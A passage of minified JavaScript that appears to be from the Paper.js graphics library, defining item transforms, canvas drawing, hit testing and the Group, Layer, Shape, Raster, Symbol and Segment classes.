                    for (var i = e(this), n = e(t), s = 0, r = Math.min(i.length, n.length); s < r; s++) if (i[s] != n[s]) return i[s]._index < n[s]._index ? 1 : -1;
                    return 0;
                },
                hasChildren: function () {
                    return this._children && this._children.length > 0;
                },
                isInserted: function () {
                    return !!this._parent && this._parent.isInserted();
                },
                isAbove: function (t) {
                    return -1 === this._getOrder(t);
                },
                isBelow: function (t) {
                    return 1 === this._getOrder(t);
                },
                isParent: function (t) {
                    return this._parent === t;
                },
                isChild: function (t) {
                    return t && t._parent === this;
                },
                isDescendant: function (t) {
                    for (var e = this; (e = e._parent); ) if (e === t) return !0;
                    return !1;
                },
                isAncestor: function (t) {
                    return !!t && t.isDescendant(this);
                },
                isSibling: function (t) {
                    return this._parent === t._parent;
                },
                isGroupedWith: function (t) {
                    for (var e = this._parent; e; ) {
                        if (e._parent && /^(Group|Layer|CompoundPath)$/.test(e._class) && t.isDescendant(e)) return !0;
                        e = e._parent;
                    }
                    return !1;
                },
            },
            s.each(
                ["rotate", "scale", "shear", "skew"],
                function (t) {
                    var e = "rotate" === t;
                    this[t] = function () {
                        var i = (e ? s : c).read(arguments),
                            n = c.read(arguments, 0, { readNull: !0 });
                        return this.transform(new m()[t](i, n || this.getPosition(!0)));
                    };
                },
                {
                    translate: function () {
                        var t = new m();
                        return this.transform(t.translate.apply(t, arguments));
                    },
                    transform: function (t, e, i, n) {
                        var s = this._matrix,
                            r = t && !t.isIdentity(),
                            o = (e || this._applyMatrix) && (!s.isIdentity() || r || (e && i && this._children));
                        if (!r && !o) return this;
                        if (r) {
                            !t.isInvertible() && s.isInvertible() && (s._backup = s.getValues()), s.prepend(t, !0);
                            var a = this._style,
                                l = a.getFillColor(!0),
                                h = a.getStrokeColor(!0);
                            l && l.transform(t), h && h.transform(t);
                        }
                        if (o && (o = this._transformContent(s, i, n))) {
                            var u = this._pivot;
                            u && s._transformPoint(u, u, !0), s.reset(!0), n && this._canApplyMatrix && (this._applyMatrix = !0);
                        }
                        var c = this._bounds,
                            d = this._position;
                        (r || o) && this._changed(25);
                        var f = r && c && t.decompose();
                        if (f && f.skewing.isZero() && f.rotation % 90 == 0) {
                            for (var p in c) {
                                var g = c[p];
                                if (g.nonscaling) delete c[p];
                                else if (o || !g.internal) {
                                    var v = g.rect;
                                    t._transformBounds(v, v);
                                }
                            }
                            this._bounds = c;
                            var m = c[this._getBoundsCacheKey(this._boundsOptions || {})];
                            m && (this._position = this._getPositionFromBounds(m.rect));
                        } else r && d && this._pivot && (this._position = t._transformPoint(d, d));
                        return this;
                    },
                    _transformContent: function (t, e, i) {
                        var n = this._children;
                        if (n) {
                            for (var s = 0, r = n.length; s < r; s++) n[s].transform(t, !0, e, i);
                            return !0;
                        }
                    },
                    globalToLocal: function () {
                        return this.getGlobalMatrix(!0)._inverseTransform(c.read(arguments));
                    },
                    localToGlobal: function () {
                        return this.getGlobalMatrix(!0)._transformPoint(c.read(arguments));
                    },
                    parentToLocal: function () {
                        return this._matrix._inverseTransform(c.read(arguments));
                    },
                    localToParent: function () {
                        return this._matrix._transformPoint(c.read(arguments));
                    },
                    fitBounds: function (t, e) {
                        t = g.read(arguments);
                        var i = this.getBounds(),
                            n = i.height / i.width,
                            s = t.height / t.width,
                            r = (e ? n > s : n < s) ? t.width / i.width : t.height / i.height,
                            o = new g(new c(), new f(i.width * r, i.height * r));
                        o.setCenter(t.getCenter()), this.setBounds(o);
                    },
                }
            ),
            {
                _setStyles: function (t, e, i) {
                    var n = this._style,
                        s = this._matrix;
                    if ((n.hasFill() && (t.fillStyle = n.getFillColor().toCanvasStyle(t, s)), n.hasStroke())) {
                        (t.strokeStyle = n.getStrokeColor().toCanvasStyle(t, s)), (t.lineWidth = n.getStrokeWidth());
                        var r = n.getStrokeJoin(),
                            o = n.getStrokeCap(),
                            a = n.getMiterLimit();
                        if ((r && (t.lineJoin = r), o && (t.lineCap = o), a && (t.miterLimit = a), st.support.nativeDash)) {
                            var l = n.getDashArray(),
                                h = n.getDashOffset();
                            l && l.length && ("setLineDash" in t ? (t.setLineDash(l), (t.lineDashOffset = h)) : ((t.mozDash = l), (t.mozDashOffset = h)));
                        }
                    }
                    if (n.hasShadow()) {
                        var u = e.pixelRatio || 1,
                            d = i._shiftless().prepend(new m().scale(u, u)),
                            f = d.transform(new c(n.getShadowBlur(), 0)),
                            p = d.transform(this.getShadowOffset());
                        (t.shadowColor = n.getShadowColor().toCanvasStyle(t)), (t.shadowBlur = f.getLength()), (t.shadowOffsetX = p.x), (t.shadowOffsetY = p.y);
                    }
                },
                draw: function (t, e, i) {
                    this._updateVersion = this._project._updateVersion;
                    if (this._visible && 0 !== this._opacity) {
                        var n = e.matrices,
                            s = e.viewMatrix,
                            r = this._matrix,
                            o = n[n.length - 1].appended(r);
                        if (o.isInvertible()) {
                            (s = s ? s.appended(o) : o), n.push(o), e.updateMatrix && (this._globalMatrix = o);
                            var a,
                                l,
                                h,
                                u = this._blendMode,
                                c = this._opacity,
                                d = "normal" === u,
                                f = et.nativeModes[u],
                                p = (d && 1 === c) || e.dontStart || e.clip || ((f || (d && c < 1)) && this._canComposite()),
                                g = e.pixelRatio || 1;
                            if (!p) {
                                var v = this.getStrokeBounds(s);
                                if (!v.width || !v.height) return void n.pop();
                                (h = e.offset), (l = e.offset = v.getTopLeft().floor()), (a = t), (t = tt.getContext(v.getSize().ceil().add(1).multiply(g))), 1 !== g && t.scale(g, g);
                            }
                            t.save();
                            var m = i ? i.appended(r) : this._canScaleStroke && !this.getStrokeScaling(!0) && s,
                                _ = !p && e.clipItem,
                                y = !m || _;
                            if ((p ? ((t.globalAlpha = c), f && (t.globalCompositeOperation = u)) : y && t.translate(-l.x, -l.y), y && (p ? r : s).applyToContext(t), _ && e.clipItem.draw(t, e.extend({ clip: !0 })), m)) {
                                t.setTransform(g, 0, 0, g, 0, 0);
                                var w = e.offset;
                                w && t.translate(-w.x, -w.y);
                            }
                            this._draw(t, e, s, m), t.restore(), n.pop(), e.clip && !e.dontFinish && t.clip(), p || (et.process(u, t, a, c, l.subtract(h).multiply(g)), tt.release(t), (e.offset = h));
                        }
                    }
                },
                _isUpdated: function (t) {
                    var e = this._parent;
                    if (e instanceof L) return e._isUpdated(t);
                    var i = this._updateVersion === t;
                    return !i && e && e._visible && e._isUpdated(t) && ((this._updateVersion = t), (i = !0)), i;
                },
                _drawSelection: function (t, e, i, n, s) {
                    var r = this._selection,
                        o = 1 & r,
                        a = 2 & r || (o && this._selectBounds),
                        l = 4 & r;
                    if ((this._drawSelected || (o = !1), (o || a || l) && this._isUpdated(s))) {
                        var h,
                            u = this.getSelectedColor(!0) || ((h = this.getLayer()) && h.getSelectedColor(!0)),
                            c = e.appended(this.getGlobalMatrix(!0)),
                            d = i / 2;
                        if (((t.strokeStyle = t.fillStyle = u ? u.toCanvasStyle(t) : "#009dec"), o && this._drawSelected(t, c, n), l)) {
                            var f = this.getPosition(!0),
                                p = this._parent,
                                g = p ? p.localToGlobal(f) : f,
                                v = g.x,
                                m = g.y;
                            t.beginPath(), t.arc(v, m, d, 0, 2 * Math.PI, !0), t.stroke();
                            for (
                                var _ = [
                                        [0, -1],
                                        [1, 0],
                                        [0, 1],
                                        [-1, 0],
                                    ],
                                    y = d,
                                    w = i + 1,
                                    x = 0;
                                x < 4;
                                x++
                            ) {
                                var b = _[x],
                                    S = b[0],
                                    C = b[1];
                                t.moveTo(v + S * y, m + C * y), t.lineTo(v + S * w, m + C * w), t.stroke();
                            }
                        }
                        if (a) {
                            var T = c._transformCorners(this.getInternalBounds());
                            t.beginPath();
                            for (x = 0; x < 8; x++) t[x ? "lineTo" : "moveTo"](T[x], T[++x]);
                            t.closePath(), t.stroke();
                            for (x = 0; x < 8; x++) t.fillRect(T[x] - d, T[++x] - d, i, i);
                        }
                    }
                },
                _canComposite: function () {
                    return !1;
                },
            },
            s.each(
                ["down", "drag", "up", "move"],
                function (t) {
                    this["removeOn" + s.capitalize(t)] = function () {
                        var e = {};
                        return (e[t] = !0), this.removeOn(e);
                    };
                },
                {
                    removeOn: function (t) {
                        for (var e in t)
                            if (t[e]) {
                                var i = "mouse" + e,
                                    n = this._project,
                                    s = (n._removeSets = n._removeSets || {});
                                (s[i] = s[i] || {}), (s[i][this._id] = this);
                            }
                        return this;
                    },
                }
            ),
            {
                tween: function (t, e, i) {
                    i || ((i = e), (e = t), (t = null), i || ((i = e), (e = null)));
                    var n = i && i.easing,
                        s = i && i.start,
                        r = null != i && ("number" == typeof i ? i : i.duration),
                        o = new J(this, t, e, r, n, s);
                    return (
                        r &&
                            this.on("frame", function t(e) {
                                o._handleFrame(1e3 * e.time), o.running || this.off("frame", t);
                            }),
                        o
                    );
                },
                tweenTo: function (t, e) {
                    return this.tween(null, t, e);
                },
                tweenFrom: function (t, e) {
                    return this.tween(t, null, e);
                },
            }
        ),
        x = w.extend({
            _class: "Group",
            _selectBounds: !1,
            _selectChildren: !0,
            _serializeFields: { children: [] },
            initialize: function (t) {
                (this._children = []), (this._namedChildren = {}), this._initialize(t) || this.addChildren(Array.isArray(t) ? t : arguments);
            },
            _changed: function t(i) {
                t.base.call(this, i), 2050 & i && (this._clipItem = e);
            },
            _getClipItem: function () {
                var t = this._clipItem;
                if (t === e) {
                    t = null;
                    for (var i = this._children, n = 0, s = i.length; n < s; n++)
                        if (i[n]._clipMask) {
                            t = i[n];
                            break;
                        }
                    this._clipItem = t;
                }
                return t;
            },
            isClipped: function () {
                return !!this._getClipItem();
            },
            setClipped: function (t) {
                var e = this.getFirstChild();
                e && e.setClipMask(t);
            },
            _getBounds: function t(e, i) {
                var n = this._getClipItem();
                return n ? n._getCachedBounds(e && e.appended(n._matrix), s.set({}, i, { stroke: !1 })) : t.base.call(this, e, i);
            },
            _hitTestChildren: function t(e, i, n) {
                var s = this._getClipItem();
                return (!s || s.contains(e)) && t.base.call(this, e, i, n, s);
            },
            _draw: function (t, e) {
                var i = e.clip,
                    n = !i && this._getClipItem();
                (e = e.extend({ clipItem: n, clip: !1 })), i ? (t.beginPath(), (e.dontStart = e.dontFinish = !0)) : n && n.draw(t, e.extend({ clip: !0 }));
                for (var s = this._children, r = 0, o = s.length; r < o; r++) {
                    var a = s[r];
                    a !== n && a.draw(t, e);
                }
            },
        }),
        b = x.extend({
            _class: "Layer",
            initialize: function () {
                x.apply(this, arguments);
            },
            _getOwner: function () {
                return this._parent || (null != this._index && this._project);
            },
            isInserted: function t() {
                return this._parent ? t.base.call(this) : null != this._index;
            },
            activate: function () {
                this._project._activeLayer = this;
            },
            _hitTestSelf: function () {},
        }),
        S = w.extend(
            {
                _class: "Shape",
                _applyMatrix: !1,
                _canApplyMatrix: !1,
                _canScaleStroke: !0,
                _serializeFields: { type: null, size: null, radius: null },
                initialize: function (t, e) {
                    this._initialize(t, e);
                },
                _equals: function (t) {
                    return this._type === t._type && this._size.equals(t._size) && s.equals(this._radius, t._radius);
                },
                copyContent: function (t) {
                    this.setType(t._type), this.setSize(t._size), this.setRadius(t._radius);
                },
                getType: function () {
                    return this._type;
                },
                setType: function (t) {
                    this._type = t;
                },
                getShape: "#getType",
                setShape: "#setType",
                getSize: function () {
                    var t = this._size;
                    return new p(t.width, t.height, this, "setSize");
                },
                setSize: function () {
                    var t = f.read(arguments);
                    if (this._size) {
                        if (!this._size.equals(t)) {
                            var e = this._type,
                                i = t.width,
                                n = t.height;
                            "rectangle" === e ? this._radius.set(f.min(this._radius, t.divide(2))) : "circle" === e ? ((i = n = (i + n) / 2), (this._radius = i / 2)) : "ellipse" === e && this._radius._set(i / 2, n / 2),
                                this._size._set(i, n),
                                this._changed(9);
                        }
                    } else this._size = t.clone();
                },
                getRadius: function () {
                    var t = this._radius;
                    return "circle" === this._type ? t : new p(t.width, t.height, this, "setRadius");
                },
                setRadius: function (t) {
                    var e = this._type;
                    if ("circle" === e) {
                        if (t === this._radius) return;
                        var i = 2 * t;
                        (this._radius = t), this._size._set(i, i);
                    } else if (((t = f.read(arguments)), this._radius)) {
                        if (this._radius.equals(t)) return;
                        if ((this._radius.set(t), "rectangle" === e)) {
                            i = f.max(this._size, t.multiply(2));
                            this._size.set(i);
                        } else "ellipse" === e && this._size._set(2 * t.width, 2 * t.height);
                    } else this._radius = t.clone();
                    this._changed(9);
                },
                isEmpty: function () {
                    return !1;
                },
                toPath: function (t) {
                    var i = new E[s.capitalize(this._type)]({ center: new c(), size: this._size, radius: this._radius, insert: !1 });
                    return i.copyAttributes(this), st.settings.applyMatrix && i.setApplyMatrix(!0), (t === e || t) && i.insertAbove(this), i;
                },
                toShape: "#clone",
                _asPathItem: function () {
                    return this.toPath(!1);
                },
                _draw: function (t, e, i, n) {
                    var s = this._style,
                        r = s.hasFill(),
                        o = s.hasStroke(),
                        a = e.dontFinish || e.clip,
                        l = !n;
                    if (r || o || a) {
                        var h = this._type,
                            u = this._radius,
                            c = "circle" === h;
                        if ((e.dontStart || t.beginPath(), l && c)) t.arc(0, 0, u, 0, 2 * Math.PI, !0);
                        else {
                            var d = c ? u : u.width,
                                f = c ? u : u.height,
                                p = this._size,
                                g = p.width,
                                v = p.height;
                            if (l && "rectangle" === h && 0 === d && 0 === f) t.rect(-g / 2, -v / 2, g, v);
                            else {
                                var m = g / 2,
                                    _ = v / 2,
                                    y = 0.44771525016920644,
                                    w = d * y,
                                    x = f * y,
                                    b = [-m, -_ + f, -m, -_ + x, -m + w, -_, -m + d, -_, m - d, -_, m - w, -_, m, -_ + x, m, -_ + f, m, _ - f, m, _ - x, m - w, _, m - d, _, -m + d, _, -m + w, _, -m, _ - x, -m, _ - f];
                                n && n.transform(b, b, 32),
                                    t.moveTo(b[0], b[1]),
                                    t.bezierCurveTo(b[2], b[3], b[4], b[5], b[6], b[7]),
                                    m !== d && t.lineTo(b[8], b[9]),
                                    t.bezierCurveTo(b[10], b[11], b[12], b[13], b[14], b[15]),
                                    _ !== f && t.lineTo(b[16], b[17]),
                                    t.bezierCurveTo(b[18], b[19], b[20], b[21], b[22], b[23]),
                                    m !== d && t.lineTo(b[24], b[25]),
                                    t.bezierCurveTo(b[26], b[27], b[28], b[29], b[30], b[31]);
                            }
                        }
                        t.closePath();
                    }
                    a || (!r && !o) || (this._setStyles(t, e, i), r && (t.fill(s.getFillRule()), (t.shadowColor = "rgba(0,0,0,0)")), o && t.stroke());
                },
                _canComposite: function () {
                    return !(this.hasFill() && this.hasStroke());
                },
                _getBounds: function (t, e) {
                    var i = new g(this._size).setCenter(0, 0),
                        n = this._style,
                        s = e.stroke && n.hasStroke() && n.getStrokeWidth();
                    return t && (i = t._transformBounds(i)), s ? i.expand(E._getStrokePadding(s, this._getStrokeMatrix(t, e))) : i;
                },
            },
            new (function () {
                function t(t, e, i) {
                    var n = t._radius;
                    if (!n.isZero())
                        for (var s = t._size.divide(2), r = 1; r <= 4; r++) {
                            var o = new c(r > 1 && r < 4 ? -1 : 1, r > 2 ? -1 : 1),
                                a = o.multiply(s),
                                l = a.subtract(o.multiply(n));
                            if (new g(i ? a.add(o.multiply(i)) : a, l).contains(e)) return { point: l, quadrant: r };
                        }
                }
                function e(t, e, i, n) {
                    var s = t.divide(e);
                    return (!n || s.isInQuadrant(n)) && s.subtract(s.normalize()).multiply(e).divide(i).length <= 1;
                }
                return {
                    _contains: function e(i) {
                        if ("rectangle" === this._type) {
                            var n = t(this, i);
                            return n ? i.subtract(n.point).divide(this._radius).getLength() <= 1 : e.base.call(this, i);
                        }
                        return i.divide(this.size).getLength() <= 0.5;
                    },
                    _hitTestSelf: function i(n, s, r, o) {
                        var a = !1,
                            l = this._style,
                            h = s.stroke && l.hasStroke(),
                            u = s.fill && l.hasFill();
                        if (h || u) {
                            var c = this._type,
                                d = this._radius,
                                f = h ? l.getStrokeWidth() / 2 : 0,
                                p = s._tolerancePadding.add(E._getStrokePadding(f, !l.getStrokeScaling() && o));
                            if ("rectangle" === c) {
                                var v = p.multiply(2),
                                    m = t(this, n, v);
                                if (m) a = e(n.subtract(m.point), d, p, m.quadrant);
                                else {
                                    var _ = new g(this._size).setCenter(0, 0),
                                        y = _.expand(v),
                                        w = _.expand(v.negate());
                                    a = y._containsPoint(n) && !w._containsPoint(n);
                                }
                            } else a = e(n, d, p);
                        }
                        return a ? new I(h ? "stroke" : "fill", this) : i.base.apply(this, arguments);
                    },
                };
            })(),
            {
                statics: new (function () {
                    function t(t, e, i, n, r) {
                        var o = new S(s.getNamed(r), e);
                        return (o._type = t), (o._size = i), (o._radius = n), o;
                    }
                    return {
                        Circle: function () {
                            var e = c.readNamed(arguments, "center"),
                                i = s.readNamed(arguments, "radius");
                            return t("circle", e, new f(2 * i), i, arguments);
                        },
                        Rectangle: function () {
                            var e = g.readNamed(arguments, "rectangle"),
                                i = f.min(f.readNamed(arguments, "radius"), e.getSize(!0).divide(2));
                            return t("rectangle", e.getCenter(!0), e.getSize(!0), i, arguments);
                        },
                        Ellipse: function () {
                            var e = S._readEllipse(arguments),
                                i = e.radius;
                            return t("ellipse", e.center, i.multiply(2), i, arguments);
                        },
                        _readEllipse: function (t) {
                            var e, i;
                            if (s.hasNamed(t, "radius")) (e = c.readNamed(t, "center")), (i = f.readNamed(t, "radius"));
                            else {
                                var n = g.readNamed(t, "rectangle");
                                (e = n.getCenter(!0)), (i = n.getSize(!0).divide(2));
                            }
                            return { center: e, radius: i };
                        },
                    };
                })(),
            }
        ),
        C = w.extend(
            {},
            {
                _class: "Raster",
                _applyMatrix: !1,
                _canApplyMatrix: !1,
                _boundsOptions: { stroke: !1, handle: !1 },
                _serializeFields: { crossOrigin: null, source: null },
                _prioritize: ["crossOrigin"],
                _smoothing: !0,
                beans: !0,
                initialize: function (t, i) {
                    var s,
                        r = typeof t,
                        o = "string" === r ? n.getElementById(t) : "object" === r ? t : null;
                    if (o && o !== w.NO_INSERT)
                        if (o.getContent || null != o.naturalHeight) s = o;
                        else if (o) {
                            var a = f.read(arguments);
                            a.isZero() || (s = tt.getCanvas(a));
                        }
                    this._initialize(t, i !== e && c.read(arguments)) || (s ? this.setImage(s) : this.setSource(t)), this._size || ((this._size = new f()), (this._loaded = !1));
                },
                _equals: function (t) {
                    return this.getSource() === t.getSource();
                },
                copyContent: function (t) {
                    var e = t._image,
                        i = t._canvas;
                    if (e) this._setImage(e);
                    else if (i) {
                        var n = tt.getCanvas(t._size);
                        n.getContext("2d").drawImage(i, 0, 0), this._setImage(n);
                    }
                    this._crossOrigin = t._crossOrigin;
                },
                getSize: function () {
                    var t = this._size;
                    return new p(t ? t.width : 0, t ? t.height : 0, this, "setSize");
                },
                setSize: function () {
                    var t = f.read(arguments);
                    if (!t.equals(this._size))
                        if (t.width > 0 && t.height > 0) {
                            var e = this.getElement();
                            this._setImage(tt.getCanvas(t)), e && this.getContext(!0).drawImage(e, 0, 0, t.width, t.height);
                        } else this._canvas && tt.release(this._canvas), (this._size = t.clone());
                },
                getWidth: function () {
                    return this._size ? this._size.width : 0;
                },
                setWidth: function (t) {
                    this.setSize(t, this.getHeight());
                },
                getHeight: function () {
                    return this._size ? this._size.height : 0;
                },
                setHeight: function (t) {
                    this.setSize(this.getWidth(), t);
                },
                getLoaded: function () {
                    return this._loaded;
                },
                isEmpty: function () {
                    var t = this._size;
                    return !t || (0 === t.width && 0 === t.height);
                },
                getResolution: function () {
                    var t = this._matrix,
                        e = new c(0, 0).transform(t),
                        i = new c(1, 0).transform(t).subtract(e),
                        n = new c(0, 1).transform(t).subtract(e);
                    return new f(72 / i.getLength(), 72 / n.getLength());
                },
                getPpi: "#getResolution",
                getImage: function () {
                    return this._image;
                },
                setImage: function (t) {
                    var e = this;
                    function i(t) {
                        var i = e.getView(),
                            n = (t && t.type) || "load";
                        i && e.responds(n) && ((st = i._scope), e.emit(n, new Z(t)));
                    }
                    this._setImage(t),
                        this._loaded
                            ? setTimeout(i, 0)
                            : t &&
                              W.add(t, {
                                  load: function (n) {
                                      e._setImage(t), i(n);
                                  },
                                  error: i,
                              });
                },
                _setImage: function (t) {
                    this._canvas && tt.release(this._canvas),
                        t && t.getContext ? ((this._image = null), (this._canvas = t), (this._loaded = !0)) : ((this._image = t), (this._canvas = null), (this._loaded = !!(t && t.src && t.complete))),
                        (this._size = new f(t ? t.naturalWidth || t.width : 0, t ? t.naturalHeight || t.height : 0)),
                        (this._context = null),
                        this._changed(1033);
                },
                getCanvas: function () {
                    if (!this._canvas) {
                        var t = tt.getContext(this._size);
                        try {
                            this._image && t.drawImage(this._image, 0, 0), (this._canvas = t.canvas);
                        } catch (e) {
                            tt.release(t);
                        }
                    }
                    return this._canvas;
                },
                setCanvas: "#setImage",
                getContext: function (t) {
                    return this._context || (this._context = this.getCanvas().getContext("2d")), t && ((this._image = null), this._changed(1025)), this._context;
                },
                setContext: function (t) {
                    this._context = t;
                },
                getSource: function () {
                    var t = this._image;
                    return (t && t.src) || this.toDataURL();
                },
                setSource: function (e) {
                    var i = new t.Image(),
                        n = this._crossOrigin;
                    n && (i.crossOrigin = n), e && (i.src = e), this.setImage(i);
                },
                getCrossOrigin: function () {
                    var t = this._image;
                    return (t && t.crossOrigin) || this._crossOrigin || "";
                },
                setCrossOrigin: function (t) {
                    this._crossOrigin = t;
                    var e = this._image;
                    e && (e.crossOrigin = t);
                },
                getSmoothing: function () {
                    return this._smoothing;
                },
                setSmoothing: function (t) {
                    (this._smoothing = t), this._changed(257);
                },
                getElement: function () {
                    return this._canvas || (this._loaded && this._image);
                },
            },
            {
                beans: !1,
                getSubCanvas: function () {
                    var t = g.read(arguments),
                        e = tt.getContext(t.getSize());
                    return e.drawImage(this.getCanvas(), t.x, t.y, t.width, t.height, 0, 0, t.width, t.height), e.canvas;
                },
                getSubRaster: function () {
                    var t = g.read(arguments),
                        e = new C(w.NO_INSERT);
                    return e._setImage(this.getSubCanvas(t)), e.translate(t.getCenter().subtract(this.getSize().divide(2))), e._matrix.prepend(this._matrix), e.insertAbove(this), e;
                },
                toDataURL: function () {
                    var t = this._image,
                        e = t && t.src;
                    if (/^data:/.test(e)) return e;
                    var i = this.getCanvas();
                    return i ? i.toDataURL.apply(i, arguments) : null;
                },
                drawImage: function (t) {
                    var e = c.read(arguments, 1);
                    this.getContext(!0).drawImage(t, e.x, e.y);
                },
                getAverageColor: function (t) {
                    var e, i;
                    if ((t ? (t instanceof A ? ((i = t), (e = t.getBounds())) : "object" == typeof t && ("width" in t ? (e = new g(t)) : "x" in t && (e = new g(t.x - 0.5, t.y - 0.5, 1, 1)))) : (e = this.getBounds()), !e)) return null;
                    var n = Math.min(e.width, 32),
                        r = Math.min(e.height, 32),
                        o = C._sampleContext;
                    o ? o.clearRect(0, 0, 33, 33) : (o = C._sampleContext = tt.getContext(new f(32))), o.save();
                    var a = new m().scale(n / e.width, r / e.height).translate(-e.x, -e.y);
                    a.applyToContext(o), i && i.draw(o, new s({ clip: !0, matrices: [a] })), this._matrix.applyToContext(o);
                    var l = this.getElement(),
                        h = this._size;
                    l && o.drawImage(l, -h.width / 2, -h.height / 2), o.restore();
                    for (var u = o.getImageData(0.5, 0.5, Math.ceil(n), Math.ceil(r)).data, c = [0, 0, 0], d = 0, p = 0, v = u.length; p < v; p += 4) {
                        var _ = u[p + 3];
                        (d += _), (_ /= 255), (c[0] += u[p] * _), (c[1] += u[p + 1] * _), (c[2] += u[p + 2] * _);
                    }
                    for (p = 0; p < 3; p++) c[p] /= d;
                    return d ? F.read(c) : null;
                },
                getPixel: function () {
                    var t = c.read(arguments),
                        e = this.getContext().getImageData(t.x, t.y, 1, 1).data;
                    return new F("rgb", [e[0] / 255, e[1] / 255, e[2] / 255], e[3] / 255);
                },
                setPixel: function () {
                    var t = c.read(arguments),
                        e = F.read(arguments),
                        i = e._convert("rgb"),
                        n = e._alpha,
                        s = this.getContext(!0),
                        r = s.createImageData(1, 1),
                        o = r.data;
                    (o[0] = 255 * i[0]), (o[1] = 255 * i[1]), (o[2] = 255 * i[2]), (o[3] = null != n ? 255 * n : 255), s.putImageData(r, t.x, t.y);
                },
                clear: function () {
                    var t = this._size;
                    this.getContext(!0).clearRect(0, 0, t.width + 1, t.height + 1);
                },
                createImageData: function () {
                    var t = f.read(arguments);
                    return this.getContext().createImageData(t.width, t.height);
                },
                getImageData: function () {
                    var t = g.read(arguments);
                    return t.isEmpty() && (t = new g(this._size)), this.getContext().getImageData(t.x, t.y, t.width, t.height);
                },
                setImageData: function (t) {
                    var e = c.read(arguments, 1);
                    this.getContext(!0).putImageData(t, e.x, e.y);
                },
                _getBounds: function (t, e) {
                    var i = new g(this._size).setCenter(0, 0);
                    return t ? t._transformBounds(i) : i;
                },
                _hitTestSelf: function (t) {
                    if (this._contains(t)) {
                        var e = this;
                        return new I("pixel", e, {
                            offset: t.add(e._size.divide(2)).round(),
                            color: {
                                get: function () {
                                    return e.getPixel(this.offset);
                                },
                            },
                        });
                    }
                },
                _draw: function (t, e, i) {
                    var n = this.getElement();
                    n && n.width > 0 && n.height > 0 && ((t.globalAlpha = this._opacity), this._setStyles(t, e, i), R.setPrefixed(t, "imageSmoothingEnabled", this._smoothing), t.drawImage(n, -this._size.width / 2, -this._size.height / 2));
                },
                _canComposite: function () {
                    return !0;
                },
            }
        ),
        T = w.extend({
            _class: "SymbolItem",
            _applyMatrix: !1,
            _canApplyMatrix: !1,
            _boundsOptions: { stroke: !0 },
            _serializeFields: { symbol: null },
            initialize: function (t, i) {
                this._initialize(t, i !== e && c.read(arguments, 1)) || this.setDefinition(t instanceof k ? t : new k(t));
            },
            _equals: function (t) {
                return this._definition === t._definition;
            },
            copyContent: function (t) {
                this.setDefinition(t._definition);
            },
            getDefinition: function () {
                return this._definition;
            },
            setDefinition: function (t) {
                (this._definition = t), this._changed(9);
            },
            getSymbol: "#getDefinition",
            setSymbol: "#setDefinition",
            isEmpty: function () {
                return this._definition._item.isEmpty();
            },
            _getBounds: function (t, e) {
                var i = this._definition._item;
                return i._getCachedBounds(i._matrix.prepended(t), e);
            },
            _hitTestSelf: function (t, e, i) {
                var n = this._definition._item._hitTest(t, e, i);
                return n && (n.item = this), n;
            },
            _draw: function (t, e) {
                this._definition._item.draw(t, e);
            },
        }),
        k = s.extend({
            _class: "SymbolDefinition",
            initialize: function (t, e) {
                (this._id = u.get()), (this.project = st.project), t && this.setItem(t, e);
            },
            _serialize: function (t, e) {
                return e.add(this, function () {
                    return s.serialize([this._class, this._item], t, !1, e);
                });
            },
            _changed: function (t) {
                8 & t && w._clearBoundsCache(this), 1 & t && this.project._changed(t);
            },
            getItem: function () {
                return this._item;
            },
            setItem: function (t, e) {
                t._symbol && (t = t.clone()), this._item && (this._item._symbol = null), (this._item = t), t.remove(), t.setSelected(!1), e || t.setPosition(new c()), (t._symbol = this), this._changed(9);
            },
            getDefinition: "#getItem",
            setDefinition: "#setItem",
            place: function (t) {
                return new T(this, t);
            },
            clone: function () {
                return new k(this._item.clone(!1));
            },
            equals: function (t) {
                return t === this || (t && this._item.equals(t._item)) || !1;
            },
        }),
        I = s.extend({
            _class: "HitResult",
            initialize: function (t, e, i) {
                (this.type = t), (this.item = e), i && this.inject(i);
            },
            statics: {
                getOptions: function (t) {
                    var e = t && s.read(t);
                    return s.set({ type: null, tolerance: st.settings.hitTolerance, fill: !e, stroke: !e, segments: !e, handles: !1, ends: !1, position: !1, center: !1, bounds: !1, guides: !1, selected: !1 }, e);
                },
            },
        }),
        O = s.extend({
            _class: "Segment",
            beans: !0,
            _selection: 0,
            initialize: function (t, i, n, s, r, o) {
                var a,
                    l,
                    h,
                    u,
                    c = arguments.length;
                c > 0 &&
                    (null == t || "object" == typeof t
                        ? 1 === c && t && "point" in t
                            ? ((a = t.point), (l = t.handleIn), (h = t.handleOut), (u = t.selection))
                            : ((a = t), (l = i), (h = n), (u = s))
                        : ((a = [t, i]), (l = n !== e ? [n, s] : null), (h = r !== e ? [r, o] : null))),
                    new P(a, this, "_point"),
                    new P(l, this, "_handleIn"),
                    new P(h, this, "_handleOut"),
                    u && this.setSelection(u);
            },
            _serialize: function (t, e) {
                var i = this._point,
                    n = this._selection,
                    r = n || this.hasHandles() ? [i, this._handleIn, this._handleOut] : i;
                return n && r.push(n), s.serialize(r, t, !0, e);
            },
            _changed: function (t) {
                var e = this._path;
                if (e) {
                    var i,
                        n = e._curves,
                        s = this._index;
                    n && ((t && t !== this._point && t !== this._handleIn) || !(i = s > 0 ? n[s - 1] : e._closed ? n[n.length - 1] : null) || i._changed(), (t && t !== this._point && t !== this._handleOut) || !(i = n[s]) || i._changed()),
                        e._changed(41);
                }
            },
            getPoint: function () {
                return this._point;
            },
            setPoint: function () {
                this._point.set(c.read(arguments));
            },
            getHandleIn: function () {
                return this._handleIn;
            },
            setHandleIn: function () {
                this._handleIn.set(c.read(arguments));
            },
            getHandleOut: function () {
                return this._handleOut;
            },
            setHandleOut: function () {
                this._handleOut.set(c.read(arguments));
            },
            hasHandles: function () {
                return !this._handleIn.isZero() || !this._handleOut.isZero();
            },
            isSmooth: function () {
                var t = this._handleIn,
                    e = this._handleOut;
                return !t.isZero() && !e.isZero() && t.isCollinear(e);
            },
            clearHandles: function () {
                this._handleIn._set(0, 0), this._handleOut._set(0, 0);
            },
            getSelection: function () {
                return this._selection;
            },
            setSelection: function (t) {
                var e = this._selection,
                    i = this._path;
                (this._selection = t = t || 0), i && t !== e && (i._updateSelection(this, e, t), i._changed(257));
            },
            _changeSelection: function (t, e) {
                var i = this._selection;
                this.setSelection(e ? i | t : i & ~t);
            },
            isSelected: function () {
                return !!(7 & this._selection);
            },
            setSelected: function (t) {
                this._changeSelection(7, t);
            },
            getIndex: function () {
                return this._index !== e ? this._index : null;
            },
            getPath: function () {
                return this._path || null;
            },
            getCurve: function () {
                var t = this._path,
                    e = this._index;
